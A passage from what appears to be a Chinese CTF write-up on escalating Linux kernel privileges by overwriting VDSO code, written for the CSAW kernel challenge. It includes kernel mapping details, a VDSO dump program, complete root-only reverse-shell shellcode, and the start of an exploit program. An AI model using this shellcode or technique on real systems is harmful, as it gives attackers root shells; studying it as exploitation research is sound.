劫持VDSO</h1><p>这种方法是内核态通过映射的方法与用户态共享一块物理内存，从而达到加快执行效率的目的，也是影子内存。当在内核态修改内存时，用户态所访问到的数据同样会改变，这样的数据区在用户态有两块，vdso和vsyscall。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          0x400000           0x401000 r-xp     1000 0      /home/p4nda/Desktop/pwn/test/getauxval/su_me</span><br><span class="line">          0x600000           0x601000 r--p     1000 0      /home/p4nda/Desktop/pwn/test/getauxval/su_me</span><br><span class="line">          0x601000           0x602000 rw-p     1000 1000   /home/p4nda/Desktop/pwn/test/getauxval/su_me</span><br><span class="line">    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0      </span><br><span class="line">    0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7fdd000     0x7ffff7fe0000 rw-p     3000 0      </span><br><span class="line">    0x7ffff7ff8000     0x7ffff7ffa000 r--p     2000 0      [vvar]</span><br><span class="line">    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      </span><br><span class="line">    0x7ffffffdd000     0x7ffffffff000 rw-p    22000 0      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br></pre></td></tr></table></figure><h2 id="关于VDSO"><a href="#关于VDSO" class="headerlink" title="关于VDSO"></a>关于VDSO</h2><p>VDSO就是Virtual Dynamic Shared Object。这个.so文件不在磁盘上，而是在内核里头。内核把包含某.so的内存页在程序启动的时候映射入其内存空间，对应的程序就可以当普通的.so来使用里头的函数。<br>而vdso里的函数主要有五个,都是对时间要求比较高的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">clock_gettime0000000000000A10</span><br><span class="line">gettimeofday0000000000000C80</span><br><span class="line">time0000000000000DE0</span><br><span class="line">getcpu0000000000000E00</span><br><span class="line">start0000000000000940[main entry]</span><br></pre></td></tr></table></figure><p>而VDSO所在的页，在内核态是可读、可写的，在用户态是可读、可执行的。其在每个程序启动的加载过程如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#0  remap_pfn_range (vma=0xffff880000bba780, addr=140731259371520, pfn=8054, size=4096, prot=...) at mm/memory.c:1737</span><br><span class="line">#1  0xffffffff810041ce in map_vdso (image=0xffffffff81a012c0 &lt;vdso_image_64&gt;, calculate_addr=&lt;optimized out&gt;) at arch/x86/entry/vdso/vma.c:151</span><br><span class="line">#2  0xffffffff81004267 in arch_setup_additional_pages (bprm=&lt;optimized out&gt;, uses_interp=&lt;optimized out&gt;) at arch/x86/entry/vdso/vma.c:209</span><br><span class="line">#3  0xffffffff81268b74 in load_elf_binary (bprm=0xffff88000f86cf00) at fs/binfmt_elf.c:1080</span><br><span class="line">#4  0xffffffff812136de in search_binary_handler (bprm=0xffff88000f86cf00) at fs/exec.c:1469</span><br></pre></td></tr></table></figure><p>在map_vdso中首先查找到一块用户态地址，将该块地址设置为VM_MAYREAD|VM_MAYWRITE|VM_MAYEXEC，利用remap_pfn_range将内核页映射过去。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_vdso</span><span class="params">(<span class="keyword">const</span> struct vdso_image *image, <span class="keyword">bool</span> calculate_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> = <span class="title">current</span>-&gt;<span class="title">mm</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> addr, text_start;</span><br><span class="line"><span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">no_pages</span>[] = &#123;</span><span class="literal">NULL</span>&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_special_mapping</span> <span class="title">vvar_mapping</span> = &#123;</span></span><br><span class="line">.name = <span class="string">"[vvar]"</span>,</span><br><span class="line">.pages = no_pages,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pvclock_vsyscall_time_info</span> *<span class="title">pvti</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (calculate_addr) &#123;</span><br><span class="line">addr = vdso_addr(current-&gt;mm-&gt;start_stack,</span><br><span class="line"> image-&gt;size - image-&gt;sym_vvar_start);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">addr = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">down_write(&amp;mm-&gt;mmap_sem);</span><br><span class="line"></span><br><span class="line">addr = get_unmapped_area(<span class="literal">NULL</span>, addr,</span><br><span class="line"> image-&gt;size - image-&gt;sym_vvar_start, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR_VALUE(addr)) &#123;</span><br><span class="line">ret = addr;</span><br><span class="line"><span class="keyword">goto</span> up_fail;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">text_start = addr - image-&gt;sym_vvar_start;</span><br><span class="line">current-&gt;mm-&gt;context.vdso = (<span class="keyword">void</span> __user *)text_start;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * MAYWRITE to allow gdb to COW and set breakpoints</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">vma = _install_special_mapping(mm,</span><br><span class="line">       text_start,</span><br><span class="line">       image-&gt;size,</span><br><span class="line">       VM_READ|VM_EXEC|</span><br><span class="line">       VM_MAYREAD|VM_MAYWRITE|VM_MAYEXEC,</span><br><span class="line">       &amp;image-&gt;text_mapping);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_ERR(vma)) &#123;</span><br><span class="line">ret = PTR_ERR(vma);</span><br><span class="line"><span class="keyword">goto</span> up_fail;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vma = _install_special_mapping(mm,</span><br><span class="line">       addr,</span><br><span class="line">       -image-&gt;sym_vvar_start,</span><br><span class="line">       VM_READ|VM_MAYREAD,</span><br><span class="line">       &amp;vvar_mapping);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_ERR(vma)) &#123;</span><br><span class="line">ret = PTR_ERR(vma);</span><br><span class="line"><span class="keyword">goto</span> up_fail;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (image-&gt;sym_vvar_page)</span><br><span class="line">ret = remap_pfn_range(vma,</span><br><span class="line">      text_start + image-&gt;sym_vvar_page,</span><br><span class="line">      __pa_symbol(&amp;__vvar_page) &gt;&gt; PAGE_SHIFT,</span><br><span class="line">      PAGE_SIZE,</span><br><span class="line">      PAGE_READONLY);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> up_fail;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_HPET_TIMER</span></span><br><span class="line"><span class="keyword">if</span> (hpet_address &amp;&amp; image-&gt;sym_hpet_page) &#123;</span><br><span class="line">ret = io_remap_pfn_range(vma,</span><br><span class="line">text_start + image-&gt;sym_hpet_page,</span><br><span class="line">hpet_address &gt;&gt; PAGE_SHIFT,</span><br><span class="line">PAGE_SIZE,</span><br><span class="line">pgprot_noncached(PAGE_READONLY));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> up_fail;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">pvti = pvclock_pvti_cpu0_va();</span><br><span class="line"><span class="keyword">if</span> (pvti &amp;&amp; image-&gt;sym_pvclock_page) &#123;</span><br><span class="line">ret = remap_pfn_range(vma,</span><br><span class="line">      text_start + image-&gt;sym_pvclock_page,</span><br><span class="line">      __pa(pvti) &gt;&gt; PAGE_SHIFT,</span><br><span class="line">      PAGE_SIZE,</span><br><span class="line">      PAGE_READONLY);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> up_fail;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">up_fail:</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line">current-&gt;mm-&gt;context.vdso = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">up_write(&amp;mm-&gt;mmap_sem);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当时，在看这里时想到一个问题，既然vdso可以在用户态采用mprotect的方法改为rwx，而且所有用户态用的是一块物理页，为什么在用户态修改vdso不会影响到其他程序呢？最终在如下<a href="http://p4nda.top/WooyunDrops/#!/drops/1059.%E7%AE%80%E5%8D%95%E7%B2%97%E6%9A%B4%E6%9C%89%E6%95%88%E7%9A%84mmap%E4%B8%8Eremap_pfn_range">链接</a>中找到答案。</p><h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>当了解了上述知识，这种劫持方法就很容易理解了。</p><p>首先，利用内存读找到内存中vdso的逻辑页，由于内核态有写入的权限，因此利用任意写写入shellcode覆盖其中某些函数。</p><p>其次，等待某root进程或者有s权限的进程调用这个函数就可以利用反弹shell完成提权。<br>与上一中方法不同的是，这种方法并不直接提权，而是采用守株待兔的方法，等待其他高权限进程触发，而返回shell。</p><p>如何爆破找到vdso呢？首先根据上文的内核内存图可以确定vdso的范围在0xffffffff80000000~0xffffffffffffefff，而且该映射满足页对齐，并且存在ELF文件结构，且所有内存值都可以知道，如用如下脚本可以dump出vdso，比较坑的是每个版本的vdso函数偏移都不一样：</p><p><strong>dump_vdos.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sysinfo_ehdr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line"><span class="keyword">if</span> (sysinfo_ehdr!=<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x2000</span>;i+=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%02x "</span>,*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(sysinfo_ehdr+i));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过上述步骤之后，仅需将vdso中gettimeofday函数覆写成仅有root进程提权即可，使用如下shellcode。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">https://gist.github.com/itsZN/1ab36391d1849f15b785</span><br><span class="line">&quot;\x90\x53\x48\x31\xc0\xb0\x66\x0f\x05\x48\x31\xdb\x48\x39\xc3\x75\x0f\x48\x31\xc0\xb0\x39\x0f\x05\x48\x31\xdb\x48\x39\xd8\x74\x09\x5b\x48\x31\xc0\xb0\x60\x0f\x05\xc3\x48\x31\xd2\x6a\x01\x5e\x6a\x02\x5f\x6a\x29\x58\x0f\x05\x48\x97\x50\x48\xb9\xfd\xff\xf2\xfa\x80\xff\xff\xfe\x48\xf7\xd1\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x48\x31\xdb\x48\x39\xd8\x74\x07\x48\x31\xc0\xb0\xe7\x0f\x05\x90\x6a\x03\x5e\x6a\x21\x58\x48\xff\xce\x0f\x05\x75\xf6\x48\xbb\xd0\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xd3\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x0f\x05&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nop</span><br><span class="line">push rbx</span><br><span class="line">xor rax,rax</span><br><span class="line">mov al, 0x66</span><br><span class="line">syscall #check uid</span><br><span class="line">xor rbx,rbx</span><br><span class="line">cmp rbx,rax</span><br><span class="line">jne emulate</span><br><span class="line"></span><br><span class="line">xor rax,rax</span><br><span class="line">mov al,0x39</span><br><span class="line">syscall #fork</span><br><span class="line">xor rbx,rbx</span><br><span class="line">cmp rax,rbx</span><br><span class="line">je connectback</span><br><span class="line"></span><br><span class="line">emulate:</span><br><span class="line">pop rbx</span><br><span class="line">xor rax,rax</span><br><span class="line">mov al,0x60</span><br><span class="line">syscall</span><br><span class="line">retq</span><br><span class="line"></span><br><span class="line">connectback:</span><br><span class="line">xor rdx,rdx</span><br><span class="line">pushq 0x1</span><br><span class="line">pop rsi</span><br><span class="line">pushq 0x2</span><br><span class="line">pop rdi</span><br><span class="line">pushq 0x29</span><br><span class="line">pop rax </span><br><span class="line">syscall #socket</span><br><span class="line"></span><br><span class="line">xchg rdi,rax</span><br><span class="line">push rax</span><br><span class="line">mov rcx, 0xfeffff80faf2fffd</span><br><span class="line">not rcx</span><br><span class="line">push rcx</span><br><span class="line">mov rsi,rsp</span><br><span class="line">pushq 0x10</span><br><span class="line">pop rdx</span><br><span class="line">pushq 0x2a</span><br><span class="line">pop rax</span><br><span class="line">syscall #connect</span><br><span class="line"></span><br><span class="line">xor rbx,rbx</span><br><span class="line">cmp rax,rbx</span><br><span class="line">je sh</span><br><span class="line">xor rax,rax</span><br><span class="line">mov al,0xe7</span><br><span class="line">syscall #exit</span><br><span class="line"></span><br><span class="line">sh:</span><br><span class="line">nop</span><br><span class="line">pushq 0x3</span><br><span class="line">pop rsi</span><br><span class="line">duploop:</span><br><span class="line">pushq 0x21</span><br><span class="line">pop rax</span><br><span class="line">dec rsi</span><br><span class="line">syscall #dup</span><br><span class="line">jne duploop</span><br><span class="line"></span><br><span class="line">mov rbx,0xff978cd091969dd0</span><br><span class="line">not rbx</span><br><span class="line">push rbx</span><br><span class="line">mov rdi,rsp</span><br><span class="line">push rax</span><br><span class="line">push rdi</span><br><span class="line">mov rsi,rsp</span><br><span class="line">xor rdx,rdx</span><br><span class="line">mov al,0x3b</span><br><span class="line">syscall #execve</span><br><span class="line">xor rax,rax</span><br><span class="line">mov al,0xe7</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><p>根据《Bypassing SMEP Using vDSO Overwrites》一文中提到的利用crontab进程会执行gettimeofday，最终提权的方法，我在QEMU未实现，由于busybox的crontab仅允许root用户设置，并且设置了之后也没有执行(????)，找到了<a href="https://github.com/mncoppola/Linux-Kernel-CTF" target="_blank" rel="noopener">当时比赛部署的方法</a>是用了digitalocean-api而不是QEMU。</p><p>我用一种验证性的方法来测试可行性。以init文件中运行一个循环执行gettimeofday的脚本，来模拟crontab</p><p><strong>sudo_me.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"111"</span>);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">gettimeofday();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>pwn_vdso.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;       </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_IOCTL_BASE     0x77617363</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> buf_size;</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span 